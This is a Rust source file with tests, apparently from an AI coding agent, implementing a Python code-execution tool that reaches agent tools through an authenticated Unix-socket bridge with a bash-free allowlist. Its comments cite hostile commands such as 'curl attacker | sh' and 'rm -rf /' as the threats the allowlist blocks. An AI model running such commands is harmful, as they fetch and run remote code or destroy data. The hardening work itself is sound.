//! Code Execution RPC — lets the LLM write a Python script that calls agent
//! tools via a Unix domain socket bridge.
//!
//! Architecture:
//! 1. LLM writes a Python script as the tool argument.
//! 2. Agent generates an `astra_tools.py` stub module with RPC helper functions.
//! 3. Agent opens a UDS listener in a temp directory.
//! 4. Agent spawns `python3 script.py` with the socket path in env.
//! 5. Script calls `astra_tools.read_file(path)` → RPC to agent → agent executes → returns result.
//! 6. Only the script's stdout is returned to the LLM.

use std::path::PathBuf;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

use serde_json::Value;
use thiserror::Error;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::UnixListener;
use tokio::process::Command;

use crate::ToolExecutor;

// ─── Constants ─────────────────────────────────────────────────────────────

/// Tools the script can invoke via RPC. Intentionally excludes `bash`:
/// script-callable `bash` collapses the allowlist into a passthrough and
/// enables `bash("curl attacker | sh")` style RCE. If the script needs a
/// subprocess, use Python's own `subprocess` module — which at least runs
/// under the same (currently unsandboxed) process boundary as the script.
pub const ALLOWED_TOOLS: &[&str] = &["read_file", "write_file", "list_dir", "grep", "web_fetch"];

/// Maximum execution time for the script (default).
pub const SCRIPT_TIMEOUT: Duration = Duration::from_secs(300);

/// Maximum number of tool calls the script can make.
pub const MAX_TOOL_CALLS: usize = 50;

/// Maximum stdout size in bytes.
pub const MAX_STDOUT_BYTES: usize = 50_000;

/// Maximum size of a single RPC request line (prevents OOM from malicious scripts).
const MAX_RPC_REQUEST_BYTES: u64 = 1_024 * 1_024; // 1 MB

// ─── Config ────────────────────────────────────────────────────────────────

/// Configuration for a code execution invocation.
#[derive(Debug, Clone)]
pub struct CodeExecConfig {
    pub timeout: Duration,
    pub max_tool_calls: usize,
    pub allowed_tools: Vec<String>,
    pub max_stdout_bytes: usize,
}

impl Default for CodeExecConfig {
    fn default() -> Self {
        Self {
            timeout: SCRIPT_TIMEOUT,
            max_tool_calls: MAX_TOOL_CALLS,
            allowed_tools: ALLOWED_TOOLS.iter().map(|s| (*s).to_string()).collect(),
            max_stdout_bytes: MAX_STDOUT_BYTES,
        }
    }
}

// ─── Errors ────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum CodeExecError {
    #[error("Script timed out after {0:?}")]
    Timeout(Duration),

    #[error("Script exceeded maximum tool call limit ({0})")]
    TooManyToolCalls(usize),

    #[error("Script exited with code {code}: {stderr}")]
    ScriptFailed { code: i32, stderr: String },

    #[error("Script has a syntax error: {0}")]
    SyntaxError(String),

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),

    #[error("Tool '{0}' is not allowed in code execution sandbox")]
    DisallowedTool(String),

    #[error("Stdout exceeded maximum size ({0} bytes)")]
    StdoutOverflow(usize),

    #[error("Internal error: {0}")]
    Internal(String),
}

// ─── Python stub generation ────────────────────────────────────────────────

/// Generate the `astra_tools.py` stub module content.
pub fn generate_python_stub() -> String {
    r#""""
astra_tools — RPC bridge for calling agent tools from Python scripts.

Available functions:
    read_file(path, offset=None, limit=None)
    write_file(path, content)
    list_dir(path=".")
    grep(pattern, path=None, include=None)
    web_fetch(url, format="markdown")

Note: `bash()` was removed — it made the allowlist meaningless. If you
need a subprocess, use Python's `subprocess` module directly (same
process boundary as this script).
"""
import json
import socket
import os

_SOCKET_PATH = os.environ["ASTRA_RPC_SOCKET"]
_AUTH_TOKEN = os.environ["ASTRA_RPC_AUTH_TOKEN"]


def _rpc_call(tool_name, args):
    """Send an RPC request to the agent and return the result."""
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(_SOCKET_PATH)
    request = json.dumps({
        "tool": tool_name,
        "args": args,
        "auth_token": _AUTH_TOKEN,
    })
    sock.sendall((request + "\n").encode())
    sock.shutdown(socket.SHUT_WR)
    response = b""
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        response += chunk
    sock.close()
    result = json.loads(response.decode())
    if result.get("error"):
        raise RuntimeError(result["error"])
    return result["output"]


def read_file(path, offset=None, limit=None):
    """Read a file's contents."""
    args = {"path": path}
    if offset is not None:
        args["offset"] = offset
    if limit is not None:
        args["limit"] = limit
    return _rpc_call("read_file", args)


def write_file(path, content):
    """Write content to a file."""
    return _rpc_call("write_file", {"path": path, "content": content})


def list_dir(path="."):
    """List directory contents."""
    return _rpc_call("list_dir", {"path": path})


def grep(pattern, path=None, include=None):
    """Search for a pattern in files."""
    args = {"pattern": pattern}
    if path is not None:
        args["path"] = path
    if include is not None:
        args["include"] = include
    return _rpc_call("grep", args)


def web_fetch(url, format="markdown"):
    """Fetch a URL."""
    return _rpc_call("web_fetch", {"url": url, "format": format})
"#
    .to_string()
}

// ─── RPC request/response types ────────────────────────────────────────────

/// Per-invocation RPC authentication token. 128 bits of entropy from a
/// random UUID (hex, 32 chars). Wraps a String so the equality check is
/// constant-time-ish (byte-wise XOR-OR, no short-circuit) and so the
/// type system prevents accidental mix-ups with unrelated strings.
///
/// Deserializes from a JSON string; serializes to a JSON string. Missing
/// auth_token in an RpcRequest fails at the deserialization boundary —
/// there is no Option/None state that business logic has to reject later.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
#[serde(transparent)]
pub struct AuthToken(String);

impl AuthToken {
    /// Generate a fresh random token. Length is currently 32 hex chars
    /// (from uuid::Uuid::simple); callers treat the length as public.
    pub fn generate() -> Self {
        Self(uuid::Uuid::new_v4().simple().to_string())
    }

    /// Access the underlying string (for setting env vars / embedding
    /// in JSON when building outgoing requests).
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Constant-time-ish equality: same-length inputs XOR every byte and
    /// OR the result, so a mismatch at byte 0 takes the same time as a
    /// mismatch at byte 31. Length mismatch short-circuits — token length
    /// is a public invariant (32 chars), not a secret.
    pub fn constant_time_eq(&self, other: &AuthToken) -> bool {
        let a = self.0.as_bytes();
        let b = other.0.as_bytes();
        if a.len() != b.len() {
            return false;
        }
        let mut diff: u8 = 0;
        for i in 0..a.len() {
            diff |= a[i] ^ b[i];
        }
        diff == 0
    }

    /// Test-only constructor from a &str. Production code should only
    /// call `generate()` — tokens are opaque random values.
    #[cfg(test)]
    pub fn from_str_for_test(s: &str) -> Self {
        Self(s.to_string())
    }
}

/// A JSON RPC request from the Python script. The `auth_token` field is
/// mandatory at the type level (no Option, no `#[serde(default)]`): a
/// request missing the token fails to deserialize, and the socket handler
/// responds with an auth error BEFORE ever touching the tool allowlist
/// or tool executor.
#[derive(Debug, serde::Deserialize)]
pub struct RpcRequest {
    pub tool: String,
    pub args: Value,
    pub auth_token: AuthToken,
}

/// A JSON RPC response to the Python script.
#[derive(Debug, serde::Serialize)]
pub struct RpcResponse {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub output: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

impl RpcResponse {
    pub fn success(output: String) -> Self {
        Self {
            output: Some(output),
            error: None,
        }
    }

    pub fn error(msg: String) -> Self {
        Self {
            output: None,
            error: Some(msg),
        }
    }
}

// ─── RPC server ────────────────────────────────────────────────────────────

/// Handle a single RPC connection: read one JSON-line request, dispatch, respond.
async fn handle_rpc_connection(
    stream: tokio::net::UnixStream,
    tool_executor: &dyn ToolExecutor,
    call_count: &AtomicUsize,
    config: &CodeExecConfig,
    auth_token: &AuthToken,
) -> Result<(), CodeExecError> {
    let (reader, mut writer) = stream.into_split();
    let mut buf_reader = BufReader::new(reader.take(MAX_RPC_REQUEST_BYTES));
    let mut line = String::new();

    // Read one JSON line (capped to prevent OOM from malicious input)
    buf_reader.read_line(&mut line).await?;
    let line = line.trim();
    if line.is_empty() {
        let resp = serde_json::to_vec(&RpcResponse::error("Empty request".into()))
            .map_err(|e| CodeExecError::Internal(e.to_string()))?;
        writer.write_all(&resp).await?;
        return Ok(());
    }

    // Parse request
    let request: RpcRequest = match serde_json::from_str(line) {
        Ok(r) => r,
        Err(e) => {
            let resp = serde_json::to_vec(&RpcResponse::error(format!("Invalid JSON: {e}")))
                .map_err(|e| CodeExecError::Internal(e.to_string()))?;
            writer.write_all(&resp).await?;
            return Ok(());
        }
    };

    // Auth check: reject connections whose token doesn't match. The
    // mandatory field means missing tokens already failed above at
    // deserialize — this arm only fires for WRONG tokens.
    if !request.auth_token.constant_time_eq(auth_token) {
        let resp = serde_json::to_vec(&RpcResponse::error(
            "RPC auth failed — invalid auth_token".into(),
        ))
        .map_err(|e| CodeExecError::Internal(e.to_string()))?;
        writer.write_all(&resp).await?;
        tracing::warn!(
            target: "astra_tools::code_exec",
            tool = %request.tool,
            "rejected RPC request with bad auth_token"
        );
        return Ok(());
    }

    // Check tool allowlist
    if !config.allowed_tools.contains(&request.tool) {
        let resp = serde_json::to_vec(&RpcResponse::error(format!(
            "Tool '{}' is not allowed. Allowed tools: {:?}",
            request.tool, config.allowed_tools
        )))
        .map_err(|e| CodeExecError::Internal(e.to_string()))?;
        writer.write_all(&resp).await?;
        return Ok(());
    }

    // Check call count
    let count = call_count.fetch_add(1, Ordering::SeqCst) + 1;
    if count > config.max_tool_calls {
        let resp = serde_json::to_vec(&RpcResponse::error(format!(
            "Exceeded maximum tool call limit ({})",
            config.max_tool_calls
        )))
        .map_err(|e| CodeExecError::Internal(e.to_string()))?;
        writer.write_all(&resp).await?;
        return Err(CodeExecError::TooManyToolCalls(config.max_tool_calls));
    }

    // Execute tool
    let result = tool_executor.execute(&request.tool, &request.args).await;

    // Send response
    let response = if result.is_error {
        RpcResponse::error(result.output)
    } else {
        RpcResponse::success(result.output)
    };
    let resp_bytes =
        serde_json::to_vec(&response).map_err(|e| CodeExecError::Internal(e.to_string()))?;
    writer.write_all(&resp_bytes).await?;
    writer.shutdown().await?;

    Ok(())
}

// ─── Main execution function ───────────────────────────────────────────────

/// Execute a Python script with tool RPC bridge.
/// Returns the script's stdout as the tool result.
pub async fn execute_code(
    script: &str,
    config: &CodeExecConfig,
    tool_executor: &dyn ToolExecutor,
) -> Result<String, CodeExecError> {
    // Create temp directory for socket + stub + script.
    let tmp_dir = tempfile::tempdir()?;
    let tmp_path = tmp_dir.path().to_path_buf();

    // Harden perms: temp dir 0o700 means only this user can enter; the
    // UDS under it inherits the protection (listing the socket requires
    // reading the dir). tempfile already does this on Unix but be explicit.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&tmp_path)?.permissions();
        perms.set_mode(0o700);
        std::fs::set_permissions(&tmp_path, perms)?;
    }

    let socket_path = tmp_path.join("rpc.sock");
    let stub_path = tmp_path.join("astra_tools.py");
    let script_path = tmp_path.join("script.py");

    // Generate per-invocation auth token. Passed to the child via env.
    let auth_token = AuthToken::generate();

    // Write Python stub (uses ASTRA_RPC_AUTH_TOKEN env).
    std::fs::write(&stub_path, generate_python_stub())?;

    // Write the user's script
    std::fs::write(&script_path, script)?;

    // Create UDS listener
    let listener = UnixListener::bind(&socket_path)?;

    // Shared call counter
    let call_count = Arc::new(AtomicUsize::new(0));

    // Spawn Python subprocess with hardened environment: minimum PATH,
    // no inherited parent vars, auth token + socket path set explicitly.
    // The LLM script must get PYTHONPATH to find astra_tools, and PATH to
    // find python3's subprocess needs. Everything else is stripped.
    let mut cmd = Command::new("python3");
    cmd.arg(&script_path)
        .env_clear()
        .env("ASTRA_RPC_SOCKET", &socket_path)
        .env("ASTRA_RPC_AUTH_TOKEN", auth_token.as_str())
        .env("HOME", "/tmp")
        .env("LANG", "C.UTF-8")
        .env("PATH", "/usr/local/bin:/usr/bin:/bin")
        .env("PYTHONPATH", tmp_path.display().to_string())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());

    // Put the child in its own session so we can kill the entire process group
    // on timeout, preventing orphaned grandchildren.
    #[cfg(unix)]
    unsafe {
        cmd.pre_exec(|| {
            libc::setsid();
            Ok(())
        });
    }

    let mut child = cmd.spawn()?;

    // Collect stdout in background (capped)
    let stdout = child.stdout.take().expect("stdout piped");
    let max_stdout = config.max_stdout_bytes;
    let stdout_handle = tokio::spawn(async move { collect_stdout(stdout, max_stdout).await });

    // Collect stderr in background
    let stderr = child.stderr.take().expect("stderr piped");
    let stderr_handle = tokio::spawn(async move {
        let mut buf = Vec::new();
        let mut reader = tokio::io::BufReader::new(stderr);
        // Read up to 10KB of stderr
        let mut total = 0usize;
        let mut line_buf = String::new();
        loop {
            line_buf.clear();
            match reader.read_line(&mut line_buf).await {
                Ok(0) => break,
                Ok(n) => {
                    total += n;
                    if total <= 10_000 {
                        buf.extend_from_slice(line_buf.as_bytes());
                    }
                }
                Err(_) => break,
            }
        }
        String::from_utf8_lossy(&buf).to_string()
    });

    // Run child + RPC server concurrently with timeout.
    // We use tokio::select! to multiplex between accepting RPC connections and
    // waiting for the child to exit.
    let timeout_result = tokio::time::timeout(config.timeout, async {
        loop {
            tokio::select! {
                // Accept an RPC connection from the script
                accept_result = listener.accept() => {
                    match accept_result {
                        Ok((stream, _)) => {
                            let result = handle_rpc_connection(
                                stream,
                                tool_executor,
                                &call_count,
                                config,
                                &auth_token,
                            )
                            .await;
                            if let Err(CodeExecError::TooManyToolCalls(_)) = result {
                                // Kill the child — it exceeded the call limit
                                kill_process_group(&child);
                                let _ = child.kill().await;
                                return child.wait().await;
                            }
                        }
                        Err(_) => {
                            // Listener error — wait for child
                            return child.wait().await;
                        }
                    }
                }
                // Child process exited
                wait_result = child.wait() => {
                    return wait_result;
                }
            }
        }
    })
    .await;

    match timeout_result {
        Ok(Ok(status)) => {
            let stdout_content = stdout_handle
                .await
                .map_err(|e| CodeExecError::Internal(e.to_string()))?;
            let stderr_content = stderr_handle
                .await
                .map_err(|e| CodeExecError::Internal(e.to_string()))?;

            if !status.success() {
                let code = status.code().unwrap_or(-1);
                // Check if it's a syntax error
                if stderr_content.contains("SyntaxError") {
                    return Err(CodeExecError::SyntaxError(stderr_content));
                }
                return Err(CodeExecError::ScriptFailed {
                    code,
                    stderr: stderr_content,
                });
            }

            Ok(stdout_content)
        }
        Ok(Err(e)) => Err(CodeExecError::Io(e)),
        Err(_) => {
            // Timeout — kill the entire process group (setsid gives child its own).
            kill_process_group(&child);
            let _ = child.kill().await;
            Err(CodeExecError::Timeout(config.timeout))
        }
    }
}

/// Kill the entire process group of the child. Because we called setsid in
/// pre_exec, the child's PID is also its PGID. This ensures forked
/// grandchildren are also terminated.
#[cfg(unix)]
fn kill_process_group(child: &tokio::process::Child) {
    if let Some(pid) = child.id() {
        // SAFETY: pid > 1 (we spawned it), negative pid = send to process group.
        unsafe {
            libc::kill(-(pid as i32), libc::SIGKILL);
        }
    }
}

#[cfg(not(unix))]
fn kill_process_group(_child: &tokio::process::Child) {}

/// Collect stdout from a reader, capping at max_bytes.
async fn collect_stdout(stdout: tokio::process::ChildStdout, max_bytes: usize) -> String {
    let mut buf = Vec::with_capacity(max_bytes.min(8192));
    let mut reader = BufReader::new(stdout);
    let mut line_buf = String::new();
    let mut total = 0usize;

    loop {
        line_buf.clear();
        match reader.read_line(&mut line_buf).await {
            Ok(0) => break,
            Ok(n) => {
                total += n;
                if buf.len() + n <= max_bytes {
                    buf.extend_from_slice(line_buf.as_bytes());
                } else if buf.len() < max_bytes {
                    let remaining = max_bytes - buf.len();
                    buf.extend_from_slice(&line_buf.as_bytes()[..remaining]);
                }
                // Keep reading to not block the child, but stop collecting
            }
            Err(_) => break,
        }
    }

    let output = String::from_utf8_lossy(&buf).to_string();
    if total > max_bytes {
        format!(
            "{}\n[stdout truncated: {} bytes total, showing first {}]",
            output, total, max_bytes
        )
    } else {
        output
    }
}

/// Parse the `execute_code` tool arguments and invoke the execution.
pub async fn handle_execute_code(
    args: &Value,
    tool_executor: &dyn ToolExecutor,
) -> crate::ToolResult {
    let script = match args.get("script").and_then(Value::as_str) {
        Some(s) => s,
        None => return crate::ToolResult::error("Error: Missing 'script' parameter".into()),
    };

    let timeout_secs = args
        .get("timeout")
        .and_then(Value::as_u64)
        .unwrap_or(SCRIPT_TIMEOUT.as_secs());

    let config = CodeExecConfig {
        timeout: Duration::from_secs(timeout_secs.min(600)),
        ..Default::default()
    };

    match execute_code(script, &config, tool_executor).await {
        Ok(output) => {
            if output.is_empty() {
                crate::ToolResult::text("(script completed with no output)".into())
            } else {
                crate::ToolResult::text(output)
            }
        }
        Err(e) => crate::ToolResult::error(format!("Error: {e}")),
    }
}

// ─── Helpers for testing ───────────────────────────────────────────────────

/// Check if Python3 is available on the system.
pub fn python3_available() -> bool {
    std::process::Command::new("python3")
        .arg("--version")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Get the temp directory path for a code execution run (for testing).
pub fn socket_path_for_test(base: &std::path::Path) -> PathBuf {
    base.join("rpc.sock")
}

// ─── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{ToolExecutor, ToolResult};
    use async_trait::async_trait;
    use serde_json::json;
    use std::path::Path;

    /// Mock tool executor for testing RPC dispatch.
    struct MockToolExecutor {
        project_root: PathBuf,
    }

    impl MockToolExecutor {
        fn new() -> Self {
            Self {
                project_root: PathBuf::from("/tmp/test"),
            }
        }
    }

    #[async_trait]
    impl ToolExecutor for MockToolExecutor {
        async fn execute(&self, name: &str, args: &Value) -> ToolResult {
            match name {
                "read_file" => {
                    let path = args.get("path").and_then(Value::as_str).unwrap_or("");
                    ToolResult::text(format!("content of {path}"))
                }
                "write_file" => ToolResult::text("File written successfully".into()),
                "list_dir" => ToolResult::text("file1.txt\nfile2.rs\ndir/".into()),
                "grep" => {
                    let pattern = args.get("pattern").and_then(Value::as_str).unwrap_or("");
                    ToolResult::text(format!("match: {pattern}"))
                }
                "bash" => {
                    let cmd = args.get("command").and_then(Value::as_str).unwrap_or("");
                    ToolResult::text(format!("bash output: {cmd}"))
                }
                "web_fetch" => {
                    let url = args.get("url").and_then(Value::as_str).unwrap_or("");
                    ToolResult::text(format!("fetched: {url}"))
                }
                _ => ToolResult::error(format!("Unknown tool: {name}")),
            }
        }

        fn tool_schemas(&self) -> Vec<Value> {
            vec![]
        }

        fn project_root(&self) -> &Path {
            &self.project_root
        }
    }

    // ── P1-1: RPC auth ────────────────────────────────────────────────────
    //
    // The Unix socket lives in /tmp; any process of the same user could
    // connect and call tools. Require a per-invocation auth token that
    // the script sends in every request.

    #[test]
    fn auth_token_is_generated_per_invocation() {
        let a = AuthToken::generate();
        let b = AuthToken::generate();
        assert_ne!(a.as_str(), b.as_str(), "tokens must be random per call");
        assert!(
            a.as_str().len() >= 16,
            "token length too short for meaningful security"
        );
    }

    // R4-#2: missing auth_token must fail at the TYPE BOUNDARY (deserialize),
    // not later at a runtime check. Before this refactor, auth_token was
    // Option<String> with #[serde(default)] — the type allowed a state that
    // business logic forbade. Now removing the field from JSON → parse error.
    #[test]
    fn rpc_request_without_auth_token_fails_to_deserialize() {
        let json_no_auth = serde_json::json!({
            "tool": "read_file",
            "args": {"path": "foo"}
        });
        let parsed: Result<RpcRequest, _> = serde_json::from_value(json_no_auth);
        assert!(
            parsed.is_err(),
            "missing auth_token must fail at deserialization, not bypass \
             via Option<None>"
        );
    }

    #[test]
    fn rpc_request_rejects_wrong_token() {
        let json_wrong = serde_json::json!({
            "tool": "read_file",
            "args": {"path": "foo"},
            "auth_token": "WRONG"
        });
        let req: RpcRequest = serde_json::from_value(json_wrong).unwrap();
        let expected = AuthToken::from_str_for_test("correct-token");
        assert!(
            !req.auth_token.constant_time_eq(&expected),
            "mismatched token must be rejected"
        );
    }

    #[test]
    fn rpc_request_accepts_correct_token() {
        let json_ok = serde_json::json!({
            "tool": "read_file",
            "args": {"path": "foo"},
            "auth_token": "correct-token"
        });
        let req: RpcRequest = serde_json::from_value(json_ok).unwrap();
        let expected = AuthToken::from_str_for_test("correct-token");
        assert!(req.auth_token.constant_time_eq(&expected));
    }

    #[test]
    fn auth_token_constant_time_eq_handles_same_length_mismatch() {
        let a = AuthToken::from_str_for_test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
        let b = AuthToken::from_str_for_test("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
        let c = AuthToken::from_str_for_test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab");
        assert!(!a.constant_time_eq(&b));
        assert!(!a.constant_time_eq(&c));
    }

    #[test]
    fn auth_token_constant_time_eq_length_mismatch() {
        let a = AuthToken::from_str_for_test("short");
        let b = AuthToken::from_str_for_test("much-longer-token");
        assert!(!a.constant_time_eq(&b));
    }

    // ── P0-1: allowlist discipline ────────────────────────────────────────

    #[test]
    fn allowed_tools_excludes_bash() {
        // bash inside the script collapses the allowlist into a passthrough:
        // the script can `bash("rm -rf /")` etc. Must not be advertised.
        assert!(
            !ALLOWED_TOOLS.contains(&"bash"),
            "bash must be removed from script-callable tool allowlist"
        );
    }

    #[test]
    fn allowed_tools_preserves_safe_read_heavy_subset() {
        // Guardrail: accidental removal of read_file/list_dir/grep would
        // gut the feature. Changing this list is deliberate.
        for name in ["read_file", "list_dir", "grep"] {
            assert!(
                ALLOWED_TOOLS.contains(&name),
                "{name} must remain in ALLOWED_TOOLS"
            );
        }
    }

    // ── Test: Python stub generation ──────────────────────────────────────

    #[test]
    fn test_generate_python_stub_is_valid() {
        let stub = generate_python_stub();
        // Must contain all required function definitions
        assert!(stub.contains("def read_file("));
        assert!(stub.contains("def write_file("));
        assert!(
            !stub.contains("def bash("),
            "bash() removed from stub — see ALLOWED_TOOLS"
        );
        assert!(stub.contains("def list_dir("));
        assert!(stub.contains("def grep("));
        assert!(stub.contains("def web_fetch("));
        // Must contain the RPC infrastructure
        assert!(stub.contains("def _rpc_call("));
        assert!(stub.contains("ASTRA_RPC_SOCKET"));
        assert!(stub.contains("socket.AF_UNIX"));
        assert!(stub.contains("json.dumps"));
        assert!(stub.contains("json.loads"));
        // P1-1: stub must send auth_token on every request.
        assert!(
            stub.contains("ASTRA_RPC_AUTH_TOKEN"),
            "stub must read ASTRA_RPC_AUTH_TOKEN so it can include auth on every RPC call"
        );
        assert!(
            stub.contains("auth_token"),
            "stub request payload must include 'auth_token' field"
        );
    }

    #[test]
    fn test_generate_python_stub_imports() {
        let stub = generate_python_stub();
        assert!(stub.contains("import json"));
        assert!(stub.contains("import socket"));
        assert!(stub.contains("import os"));
    }

    // ── Test: RPC request/response parsing ────────────────────────────────

    #[test]
    fn test_rpc_request_parsing() {
        // Mandatory auth_token — a request without it no longer parses
        // (see rpc_request_without_auth_token_fails_to_deserialize).
        let json_str = r#"{"tool": "read_file", "args": {"path": "foo.txt"}, "auth_token": "t"}"#;
        let req: RpcRequest = serde_json::from_str(json_str).unwrap();
        assert_eq!(req.tool, "read_file");
        assert_eq!(req.args["path"], "foo.txt");
    }

    #[test]
    fn test_rpc_request_parsing_empty_args() {
        let json_str = r#"{"tool": "list_dir", "args": {}, "auth_token": "t"}"#;
        let req: RpcRequest = serde_json::from_str(json_str).unwrap();
        assert_eq!(req.tool, "list_dir");
        assert!(req.args.as_object().unwrap().is_empty());
    }

    #[test]
    fn test_rpc_response_success() {
        let resp = RpcResponse::success("hello world".into());
        let json = serde_json::to_value(&resp).unwrap();
        assert_eq!(json["output"], "hello world");
        assert!(json.get("error").is_none());
    }

    #[test]
    fn test_rpc_response_error() {
        let resp = RpcResponse::error("something failed".into());
        let json = serde_json::to_value(&resp).unwrap();
        assert_eq!(json["error"], "something failed");
        assert!(json.get("output").is_none());
    }

    // ── Test: Config defaults ─────────────────────────────────────────────

    #[test]
    fn test_config_defaults() {
        let config = CodeExecConfig::default();
        assert_eq!(config.timeout, Duration::from_secs(300));
        assert_eq!(config.max_tool_calls, 50);
        assert_eq!(config.max_stdout_bytes, 50_000);
        assert_eq!(config.allowed_tools.len(), ALLOWED_TOOLS.len());
        for tool in ALLOWED_TOOLS {
            assert!(config.allowed_tools.contains(&tool.to_string()));
        }
    }

    // ── Test: ALLOWED_TOOLS enforcement ───────────────────────────────────

    #[test]
    fn test_allowed_tools_contains_expected() {
        assert!(ALLOWED_TOOLS.contains(&"read_file"));
        assert!(ALLOWED_TOOLS.contains(&"write_file"));
        assert!(ALLOWED_TOOLS.contains(&"list_dir"));
        assert!(ALLOWED_TOOLS.contains(&"grep"));
        assert!(
            !ALLOWED_TOOLS.contains(&"bash"),
            "bash removed: see allowed_tools_excludes_bash"
        );
        assert!(ALLOWED_TOOLS.contains(&"web_fetch"));
    }

    #[test]
    fn test_allowed_tools_excludes_dangerous() {
        // These tools should NOT be allowed in the sandbox
        assert!(!ALLOWED_TOOLS.contains(&"git_commit"));
        assert!(!ALLOWED_TOOLS.contains(&"delete_file"));
        assert!(!ALLOWED_TOOLS.contains(&"memory_store"));
        assert!(!ALLOWED_TOOLS.contains(&"memory_purge"));
    }

    // ── Test: Tool call counting via RPC ──────────────────────────────────

    #[tokio::test]
    async fn test_tool_call_counting_rejects_excess() {
        let call_count = AtomicUsize::new(49); // one below limit
        let config = CodeExecConfig {
            max_tool_calls: 50,
            ..Default::default()
        };
        let executor = MockToolExecutor::new();
        let token_str = "test-token-abcd";
        let token = AuthToken::from_str_for_test(token_str);

        // Create a UDS pair for testing
        let tmp = tempfile::tempdir().unwrap();
        let sock_path = tmp.path().join("test.sock");
        let listener = UnixListener::bind(&sock_path).unwrap();

        // First call (count becomes 50) — should succeed
        let client1 = tokio::net::UnixStream::connect(&sock_path).await.unwrap();
        let (stream1, _) = listener.accept().await.unwrap();

        // Write a valid request with auth token
        let req = format!(
            r#"{{"tool": "read_file", "args": {{"path": "test.txt"}}, "auth_token": "{token_str}"}}"#
        );
        use tokio::io::AsyncWriteExt;
        let (_, mut writer1) = client1.into_split();
        writer1.write_all(req.as_bytes()).await.unwrap();
        writer1.write_all(b"\n").await.unwrap();
        writer1.shutdown().await.unwrap();

        let result = handle_rpc_connection(stream1, &executor, &call_count, &config, &token).await;
        assert!(result.is_ok());
        assert_eq!(call_count.load(Ordering::SeqCst), 50);

        // Second call (count becomes 51) — should fail
        let client2 = tokio::net::UnixStream::connect(&sock_path).await.unwrap();
        let (stream2, _) = listener.accept().await.unwrap();

        let (_, mut writer2) = client2.into_split();
        writer2.write_all(req.as_bytes()).await.unwrap();
        writer2.write_all(b"\n").await.unwrap();
        writer2.shutdown().await.unwrap();

        let result = handle_rpc_connection(stream2, &executor, &call_count, &config, &token).await;
        assert!(matches!(result, Err(CodeExecError::TooManyToolCalls(50))));
    }

    // ── Test: Disallowed tool via RPC ─────────────────────────────────────

    #[tokio::test]
    async fn test_disallowed_tool_rejected() {
        let call_count = AtomicUsize::new(0);
        let config = CodeExecConfig::default();
        let executor = MockToolExecutor::new();
        let token_str = "tok";
        let token = AuthToken::from_str_for_test(token_str);

        let tmp = tempfile::tempdir().unwrap();
        let sock_path = tmp.path().join("test.sock");
        let listener = UnixListener::bind(&sock_path).unwrap();

        let client = tokio::net::UnixStream::connect(&sock_path).await.unwrap();
        let (stream, _) = listener.accept().await.unwrap();

        // Try a disallowed tool (with correct auth — allowlist check is what rejects)
        let req = format!(
            r#"{{"tool": "git_commit", "args": {{"message": "evil"}}, "auth_token": "{token_str}"}}"#
        );
        let (_, mut writer) = client.into_split();
        writer.write_all(req.as_bytes()).await.unwrap();
        writer.write_all(b"\n").await.unwrap();
        writer.shutdown().await.unwrap();

        let result = handle_rpc_connection(stream, &executor, &call_count, &config, &token).await;
        // Should succeed (the handler writes an error response, doesn't return Err)
        assert!(result.is_ok());
        // Call count should NOT have incremented
        assert_eq!(call_count.load(Ordering::SeqCst), 0);
    }

    // ── P1-1: RPC auth rejects bad token over actual socket ───────────────

    #[tokio::test]
    async fn rpc_request_without_token_rejected_via_socket() {
        let call_count = AtomicUsize::new(0);
        let config = CodeExecConfig::default();
        let executor = MockToolExecutor::new();
        let token = AuthToken::from_str_for_test("real-token");

        let tmp = tempfile::tempdir().unwrap();
        let sock_path = tmp.path().join("auth.sock");
        let listener = UnixListener::bind(&sock_path).unwrap();

        let client = tokio::net::UnixStream::connect(&sock_path).await.unwrap();
        let (stream, _) = listener.accept().await.unwrap();

        // Request that a sibling (non-authorized) process might send:
        // no auth_token field at all. Now fails at deserialize, before
        // the allowlist or executor is reached.
        let req = r#"{"tool": "read_file", "args": {"path": "x"}}"#;
        use tokio::io::AsyncWriteExt;
        let (mut reader, mut writer) = client.into_split();
        writer.write_all(req.as_bytes()).await.unwrap();
        writer.write_all(b"\n").await.unwrap();
        writer.shutdown().await.unwrap();

        let _ = handle_rpc_connection(stream, &executor, &call_count, &config, &token).await;

        // Verify the response is an auth error (not tool output).
        use tokio::io::AsyncReadExt;
        let mut resp = Vec::new();
        reader.read_to_end(&mut resp).await.unwrap();
        let resp_str = String::from_utf8_lossy(&resp);
        assert!(
            resp_str.contains("auth"),
            "expected auth-related error response, got: {resp_str}"
        );
        // Tool must NOT have been invoked.
        assert_eq!(call_count.load(Ordering::SeqCst), 0);
    }

    // ── Integration tests (require Python3) ───────────────────────────────

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_execute_simple_script() {
        if !python3_available() {
            eprintln!("Skipping: python3 not available");
            return;
        }
        let executor = MockToolExecutor::new();
        let config = CodeExecConfig {
            timeout: Duration::from_secs(10),
            ..Default::default()
        };

        let script = r#"print("hello from python")"#;
        let result = execute_code(script, &config, &executor).await;
        assert!(result.is_ok(), "got: {:?}", result);
        assert_eq!(result.unwrap().trim(), "hello from python");
    }

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_execute_script_calls_read_file() {
        if !python3_available() {
            eprintln!("Skipping: python3 not available");
            return;
        }
        let executor = MockToolExecutor::new();
        let config = CodeExecConfig {
            timeout: Duration::from_secs(10),
